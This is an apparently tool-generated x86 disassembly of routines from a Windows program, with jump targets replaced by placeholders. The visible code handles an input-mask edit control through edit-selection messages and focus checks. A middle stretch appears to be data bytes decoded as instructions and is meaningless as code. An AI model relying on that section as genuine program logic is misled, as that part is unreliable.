pop edi
pop esi
pop ebx
retn
or ebp 0xffffffff
or edi 0xffffffff
mov eax esi
call sub_40427c
mov ebx eax
dec ebx
test ebx ebx
jle r-xdata
test ebp ebp
jge r-xdata
test edi edi
jge r-xdata
mov eax esi
call sub_40427c
sub eax 0x4
cmp ebx eax
jl r-xdata
mov edi ebx
mov ebp ebx
jmp r-xdata
test edi edi
jle r-xdata
mov edi ebp
test edi edi
jl r-xdata
mov eax esi
call sub_40427c
cmp edi eax
je r-xdata
mov edx ebx
mov eax esi
call sub_45fdd4
cmp al 0x6
jne r-xdata
mov al [ esi + edi ]
cmp al [ rw-data ]
sete al
xor al 0x1
mov [ esp ] al
sub_460264
push ebx
push esi
mov esi eax
mov bl [ rw-data ]
mov eax esi
call sub_40427c
cmp eax 0x4
jl r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax esi
call sub_40427c
mov edx eax
dec edx
mov eax esi
call sub_45fdd4
cmp al 0x6
jne r-xdata
mov eax esi
call sub_40427c
mov edx eax
sub edx 0x2
mov eax esi
call sub_45fdd4
cmp al 0x6
je r-xdata
mov eax esi
call sub_40427c
mov bl [ esi + eax - 0x1 ]
mov eax esi
call sub_40427c
mov edx eax
sub edx 0x3
mov eax esi
call sub_45fdd4
cmp al 0x6
jne r-xdata
sub_4602d0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_46034d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_403fbc
mov esi ebx
test esi esi
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460354
lea eax [ ebp - 0x8 ]
call sub_403fbc
retn
mov ebx 0x1
inc ebx
dec esi
jne r-xdata
add al 0xfd
sub al 0x2
jb r-xdata
mov edx ebx
mov eax edi
call sub_45fdd4
sub al 0x3
je r-xdata
lea eax [ ebp - 0x8 ]
mov dl [ edi + ebx - 0x1 ]
call sub_4041a4
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_404284
mov eax [ ebp - 0x4 ]
sub_46035c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4603a1
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_4602d0
mov eax [ ebp - 0x4 ]
call sub_40427c
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4603a8
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
sub_4603b0
push ebx
push esi
push edi
push ebp
push ecx
mov ebx edx
mov edi eax
mov eax edi
call sub_40427c
mov edx eax
mov eax edi
call sub_46035c
cmp eax ebx
jge r-xdata
xor ebp ebp
mov [ esp ] ebx
mov eax edi
call sub_40427c
mov ebx eax
test ebx ebx
jle r-xdata
or ebp 0xffffffff
jmp r-xdata
mov eax ebp
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi 0x1
inc esi
dec ebx
jne r-xdata
dec [ esp ]
cmp [ esp ] 0x0
jl r-xdata
inc ebp
mov edx esi
mov eax edi
call sub_45fdd4
cmp al 0x3
je r-xdata
sub_46040c
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax esi
call sub_4603b0
test eax eax
jl r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov edx eax
mov eax esi
call sub_45fdd4
dec eax
sub al 0x2
setb bl
sub_460434
push ebp
mov ebp esp
push ecx
mov ecx 0x4
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov edi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
mov esi [ ebp + 0x14 ]
xor eax eax
push ebp
push sub_4605b9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
sub eax [ ebp - 0x8 ]
cmp eax [ ebp + 0x10 ]
jge r-xdata
mov eax esi
sub eax [ ebp - 0x8 ]
cmp eax [ ebp + 0x10 ]
jle r-xdata
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_45ff28
mov [ ebp - 0x9 ] al
mov eax esi
dec eax
mov [ ebp - 0x10 ] eax
test [ ebp - 0x9 ] 0x1
je r-xdata
mov eax ebx
mov edx edi
call sub_404010
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_45ff28
mov [ ebp - 0x9 ] al
test [ ebp - 0x9 ] 0x1
je r-xdata
push ebx
mov ecx [ ebp - 0x10 ]
mov edx 0x1
mov eax edi
call sub_4044dc
sub esi [ ebp - 0x8 ]
mov eax [ ebp + 0x10 ]
sub eax esi
test eax eax
jle r-xdata
mov eax [ ebp - 0x8 ]
dec eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x24 ]
push eax
mov eax edi
call sub_40427c
mov ecx eax
mov edx esi
mov eax edi
call sub_4044dc
mov eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebp - 0x8 ]
add ecx [ ebp + 0x10 ]
dec ecx
mov edx 0x1
mov eax edi
call sub_4044dc
mov edx [ ebp - 0x28 ]
mov eax ebx
pop ecx
call sub_4042c8
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov eax edi
call sub_40427c
mov ecx eax
mov edx esi
sub edx [ ebp + 0x10 ]
mov eax edi
call sub_4044dc
mov eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebp - 0x8 ]
dec ecx
mov edx 0x1
mov eax edi
call sub_4044dc
mov edx [ ebp - 0x20 ]
mov eax ebx
pop ecx
call sub_4042c8
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov eax edi
call sub_40427c
mov ecx eax
mov edx [ ebp - 0x10 ]
inc edx
mov eax edi
call sub_4044dc
mov edx [ ebp - 0x18 ]
mov eax ebx
call sub_404284
jmp r-xdata
mov esi eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4605c0
lea eax [ ebp - 0x28 ]
mov edx 0x6
call sub_403fe0
retn
lea eax [ ebp - 0x14 ]
mov dl [ ebp + 0xc ]
call sub_4041a4
mov edx [ ebp - 0x14 ]
mov eax ebx
call sub_404284
dec esi
jne r-xdata
sub_4605cc
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1 ] cl
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_460792
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax ebx
mov edx edi
call sub_404010
mov eax esi
call sub_40427c
test eax eax
jle r-xdata
mov eax esi
call sub_40427c
mov edx eax
mov eax esi
call sub_46035c
mov edi eax
mov eax [ ebx ]
call sub_40427c
cmp edi eax
je r-xdata
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x1
mov eax [ ebx ]
call sub_40427c
test eax eax
jle r-xdata
mov eax [ ebx ]
call sub_40427c
inc eax
push eax
sub edi [ ebp - 0x8 ]
push edi
mov al [ ebp - 0x1 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebp - 0x8 ]
inc ecx
mov edx [ ebx ]
mov eax esi
call sub_460434
mov edx [ ebp - 0x28 ]
mov eax ebx
call sub_404010
inc [ ebp - 0x14 ]
dec [ ebp - 0x18 ]
jne r-xdata
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_46035c
mov [ ebp - 0x10 ] eax
mov eax [ ebx ]
call sub_40427c
inc eax
mov [ ebp - 0xc ] eax
mov edi [ ebp - 0x8 ]
inc edi
mov eax [ ebx ]
call sub_40427c
sub eax edi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460799
lea eax [ ebp - 0x28 ]
mov edx 0x3
call sub_403fe0
retn
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x10 ] 0x1
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_45fdd4
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebx ]
call sub_40427c
cmp eax [ ebp - 0xc ]
jge r-xdata
inc eax
mov [ ebp - 0x1c ] eax
inc [ ebp - 0x10 ]
dec [ ebp - 0x18 ]
jne r-xdata
mov edx [ ebp - 0x10 ]
dec edx
mov eax esi
call sub_46040c
test al al
jne r-xdata
mov eax [ ebp - 0xc ]
push eax
mov edi [ ebp - 0x8 ]
inc edi
mov eax [ ebp - 0x10 ]
sub eax edi
push eax
mov al [ ebp - 0x1 ]
push eax
lea eax [ ebp - 0x24 ]
push eax
mov ecx edi
mov edx [ ebx ]
mov eax esi
call sub_460434
mov edx [ ebp - 0x24 ]
mov eax ebx
call sub_404010
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x14 ]
mov al [ esi + eax - 0x1 ]
call sub_45ffa4
mov edx eax
lea eax [ ebp - 0x20 ]
call sub_4041a4
mov edx [ ebp - 0x20 ]
mov eax ebx
call sub_404284
inc edi
dec [ ebp - 0x1c ]
jne r-xdata
mov [ ebp - 0xc ] edi
jmp r-xdata
mov eax [ ebx ]
mov edx [ ebp - 0x10 ]
cmp [ eax + edx - 0x1 ] 0x20
jne r-xdata
mov eax ebx
call j_sub_404488
mov edx [ ebp - 0x10 ]
mov cl [ ebp - 0x1 ]
mov [ eax + edx - 0x1 ] cl
mov eax [ ebp - 0x14 ]
mov al [ esi + eax - 0x1 ]
call sub_45ffa4
mov edx [ ebx ]
cmp al [ edx + edi - 0x1 ]
jne r-xdata
sub_4607a4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4607c9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4607d0
retn
sub_46103c
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
add [ eax ] cl
push ebx
push 0x6948776f
outsb
je r-xdata
std
inc ebp
add ah dl
adc eax 0x16680046
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5404002d ] al
js r-xdata
push eax
outsd
jo r-xdata
lea eax [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0031 ] al
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe9451108
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0032 ] al
outsb
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
in al 0xdd
inc ebx
add [ edi + edi * 8 + 0x43 ] cl
add [ eax + 0x1 ] al
add [ cs : edi ] al
push esi
imul esi [ ebx + 0x69 ] 0xdc656c62
adc [ ecx ] al
sbb [ edx ] al
add bh bh
sbb [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ eax ] cl
dec edi
outsb
inc ebx
push 0x65676e61
fcom [ eax ]
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
[ ecx + ecx * 2 ]
jo r-xdata
add [ eax ] 0x0
add [ eax + 0x4f090035 ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
inc esp
jb r-xdata
xchg esp eax
dec eax
inc esp
add [ ecx + ecx * 2 ] dl
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
outsb
jne r-xdata
dec ebx
jns r-xdata
fcom [ bx + si ]
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
adc [ ecx ] al
rol [ ecx ] 0x0
jo r-xdata
adc [ eax ] al
push cs
add al [ eax ]
[ edx + eax * 2 + 0x10043 ]
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
jns r-xdata
jb r-xdata
inc esp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al [ eax ]
or cl [ edi + 0x6e ]
nop
inc ebx
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0033 ] al
outsb
inc esp
jb r-xdata
loopne r-xdata
jo r-xdata
pop [ ebx ]
lodsb [ esi ]
nop
inc ebx
add al ah
add [ eax ] eax
jmp eax
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp al 0x0
or ecx [ edi + 0x6e ]
jb r-xdata
adc [ ecx ] al
enter 0x1 0xff
enter 0x1 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
aaa
add [ esi ] al
dec edi
add [ eax + 0x4f070036 ] al
add [ eax ] al
dec edi
jbe r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp eax 0x6e4f0900
dec ebp
outsd
jne r-xdata
outsb
inc ebp
js r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060037 ] al
pop [ ebx ]
rol [ eax ] 0x1
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp eax [ eax ]
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
popad
dec ebp
dec ebp
outsd
jne r-xdata
dec edi
outsb
jae r-xdata
jns r-xdata
je r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
add al [ eax ]
add [ ecx + rw-data ] ah
push ebp
jo r-xdata
arpl [ ebx - 0x30 ] bp
xchg ecx eax
inc ebx
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003f ] al
inc esp
outsd
ja r-xdata
mov al [ eax ]
mov [ esi + 0x224 ] al
mov eax esi
test bl bl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_434070
mov al [ r-xdata ]
mov [ esi + 0x22d ] al
mov eax [ rw-data ]
add esp 0xfffffff0
call sub_403590
outsb
push ebx
je r-xdata
dec edi
test [ edi + 0xe00043 ] cl
add bh bh
add [ eax ] al
jmp eax
pushad
nop
inc ebx
add al ch
add [ eax ] eax
cmp al [ eax ]
pop es
dec edi
nop
inc ebx
add al bl
add [ eax ] eax
add [ ecx ] cl
dec edi
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x18 ] bp
xchg edx eax
inc ebx
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg edx eax
inc ebx
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090034 ] al
mov eax esi
pop esi
pop ebx
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
outsd
jbe r-xdata
xchg ebx eax
inc ebx
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003e ] al
outsb
push ebx
je r-xdata
mov esi edx
mov ebx eax
cmp [ ebx + 0x23c ] 0x0
jne r-xdata
jb r-xdata
cld
mov [ ebx + ebx * 8 - 0x5117f08c ] 0x22
cli
jmp [ edi + ecx * 4 + 0x5 ]
jb r-xdata
mov eax ebx
call sub_461888
test al al
je r-xdata
mov edx esi
mov cl [ esp ]
mov eax ebx
call sub_443524
mov ch 0x21
inc esp
jb r-xdata
inc esp
outsd
pop edx
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
mov ebx 0x23c
add [ ebp + 0xc ] dh
nop
push ebx
push esi
test dl dl
je r-xdata
test [ esp ] 0x2
jne r-xdata
cmp [ esi ] 0x25
je r-xdata
mov dx [ esi ]
mov cl [ esp ]
mov eax ebx
call sub_461f64
test [ esp ] 0x1
jne r-xdata
cmp [ esi ] 0x27
jne r-xdata
test [ esp ] 0x4
jne r-xdata
cmp [ esi ] 0x26
je r-xdata
mov [ esi ] 0x0
jmp r-xdata
mov [ esi ] 0x0
jmp r-xdata
cmp [ esi ] 0x28
jne r-xdata
cmp [ esi ] 0x24
je r-xdata
mov dx [ esi ]
mov cl [ esp ]
mov eax ebx
call sub_4621fc
mov [ esi ] 0x0
jmp r-xdata
cmp [ esi ] 0x23
jne r-xdata
cmp [ esi ] 0x2e
jne r-xdata
cmp [ esi ] 0x8
jne r-xdata
test [ esp ] 0x1
je r-xdata
mov eax ebx
call sub_461d18
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe8 ]
test al al
je r-xdata
mov [ esi ] 0x0
jmp r-xdata
mov dx [ esi ]
mov eax ebx
call sub_4622cc
sub_461430
push ebx
push esi
push ecx
mov [ esp ] cl
mov esi edx
mov ebx eax
cmp [ ebx + 0x23c ] 0x0
jne r-xdata
mov eax ebx
call sub_461888
test al al
je r-xdata
mov edx esi
mov cl [ esp ]
mov eax ebx
call sub_44360c
pop edx
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
cmp [ esi ] 0x25
je r-xdata
test [ esp ] 0x4
je r-xdata
cmp [ esi ] 0x27
jne r-xdata
mov eax ebx
call sub_461d18
sub_461480
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_4436dc
mov eax esi
call sub_461888
test al al
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx ] 0x0
je r-xdata
mov al [ ebx ]
sub al 0x3
je r-xdata
sub al 0x13
je r-xdata
sub al 0x2
je r-xdata
mov edx ebx
mov eax esi
call sub_461d8c
mov [ ebx ] 0x0
sub_4614d8
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43f8a8
mov eax ebx
call sub_461888
test al al
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax ebx
call sub_461a60
mov eax [ esp ]
mov [ ebx + 0x230 ] eax
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov eax ebx
call sub_461d18
movsx eax [ esi + 0x8 ]
cmp eax [ ebx + 0x234 ]
jle r-xdata
mov eax [ esp + 0x4 ]
mov [ ebx + 0x230 ] eax
sub_461558
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4615b4
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4615c0
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_4043c8
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4615bb
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
mov eax esi
call sub_40447c
mov edx eax
mov eax ebx
call sub_43dea0
mov eax ebx
call sub_461d18
sub_4615d4
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_461658
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_461888
test al al
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4615c0
mov edx [ ebp - 0x4 ]
mov ecx esi
mov eax ebx
call sub_462698
cmp [ ebx + 0x22c ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_43dec4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46165f
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fe0
retn
lea eax [ ebp - 0x8 ]
push eax
mov edx [ esi ]
xor ecx ecx
mov eax ebx
call sub_462650
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_404010
sub_461668
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46175e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_461888
test al al
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_404054
cmp [ ebx + 0x22c ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_43def4
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov cl 0x1
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_462650
mov edx [ ebp - 0x10 ]
lea eax [ ebp - 0x4 ]
call sub_404054
lea eax [ ebp - 0xc ]
push eax
mov cl [ ebx + 0x224 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x220 ]
call sub_4605cc
mov edx [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
call sub_404054
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461765
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403fe0
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_461558
test [ ebx + 0x1c ] 0x10
je r-xdata
test [ ebx + 0x22d ] 0x4
jne r-xdata
test [ ebx + 0x1c ] 0x1
jne r-xdata
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0xf0 ]
test al al
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4d0
call sub_4039f8
sub_46176c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_461888
test al al
jne r-xdata
mov eax ebx
call sub_4343dc
mov dx 0x2e
mov eax ebx
call sub_4622cc
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_4617a0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46187a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_461888
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
cmp [ ebx + 0x20e ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461881
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fe0
retn
call sub_42c7f4
mov edx [ eax ]
call [ edx + 0x18 ]
call sub_42c7f4
lea edx [ ebp - 0x4 ]
call sub_42c43c
call sub_42c7f4
mov edx [ eax ]
call [ edx + 0x14 ]
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_461a60
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_4615c0
mov eax [ ebp - 0x10 ]
sub eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
mov eax ebx
call sub_462d84
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_461558
mov eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_462e1c
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_461558
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_461aa8
sub_461898
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46194d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_4615c0
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_462698
lea eax [ ebx + 0x220 ]
mov edx esi
call sub_404010
mov eax esi
call sub_40427c
mov edx eax
mov eax [ ebx + 0x220 ]
call sub_46035c
mov [ ebx + 0x228 ] eax
mov eax esi
call sub_4601e0
mov [ ebx + 0x22c ] al
mov eax esi
call sub_460264
mov [ ebx + 0x224 ] al
lea eax [ ebp - 0xc ]
push eax
mov cl 0x1
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_462650
mov edx [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
call sub_404054
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_461558
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461954
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_403fe0
retn
sub_46195c
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x220 ]
call sub_4043c8
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_4449fc
test al al
je r-xdata
test esi esi
je r-xdata
mov edx esi
mov eax ebx
call sub_461898
and [ ebx + 0x22d ] 0xfe
cmp [ ebx + 0x220 ] 0x0
je r-xdata
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax ebx
call sub_461a60
test [ ebx + 0x1c ] 0x1
jne r-xdata
xor edx edx
mov eax ebx
call sub_434184
mov eax ebx
call sub_461888
test al al
je r-xdata
or [ ebx + 0x22d ] 0x1
xor edx edx
mov eax ebx
call sub_461558
mov eax ebx
call sub_4449fc
test al al
je r-xdata
cmp [ ebx + 0x228 ] 0x0
jle r-xdata
mov eax ebx
call sub_4446f8
mov esi eax
call GetFocus
cmp esi eax
jne r-xdata
mov edx [ ebx + 0x228 ]
mov eax ebx
call sub_434184
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx [ esp ]
mov eax ebx
call sub_461aa8
sub_461a30
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_461888
test al al
jne r-xdata
mov edx [ ebx + 0x228 ]
mov eax ebx
call sub_434184
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_434184
pop esi
pop ebx
retn
sub_461a60
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0xb0
mov eax ebx
call sub_4446f8
push eax
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_461a84
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0xb1
mov eax ebx
call sub_4446f8
push eax
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_461aa8
push ebp
mov ebp esp
add esp 0xfffffde4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x21c ] ecx
mov [ ebp - 0x218 ] ecx
mov [ ebp - 0x214 ] ecx
mov [ ebp - 0x210 ] ecx
mov [ ebp - 0x20c ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_461d08
push [ fs : eax ]
mov [ fs : eax ] esp
cmp ebx 0x1
jl r-xdata
mov [ ebp - 0x8 ] ebx
mov eax [ ebp - 0x4 ]
call sub_461888
test al al
je r-xdata
lea edx [ ebp - 0x20c ]
mov eax [ ebp - 0x4 ]
call sub_4615c0
mov eax [ ebp - 0x20c ]
mov edx ebx
call sub_40bdc8
cmp al 0x1
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jge r-xdata
cmp [ ebp - 0x8 ] 0x0
jge r-xdata
dec ebx
lea edx [ ebp - 0x218 ]
mov eax [ ebp - 0x4 ]
call sub_4615c0
mov eax [ ebp - 0x218 ]
call sub_40427c
cmp eax [ ebp - 0x8 ]
jg r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov ebx [ ebp - 0x8 ]
inc ebx
lea edx [ ebp - 0x210 ]
mov eax [ ebp - 0x4 ]
call sub_4615c0
mov eax [ ebp - 0x210 ]
call sub_40427c
cmp ebx eax
jge r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_461a84
lea edx [ ebp - 0x21c ]
mov eax [ ebp - 0x4 ]
call sub_4615c0
mov eax [ ebp - 0x21c ]
call sub_40427c
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x228 ]
cmp eax [ ebp - 0x8 ]
jg r-xdata
lea edx [ ebp - 0x214 ]
mov eax [ ebp - 0x4 ]
call sub_4615c0
mov eax [ ebp - 0x214 ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
mov ecx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_461a84
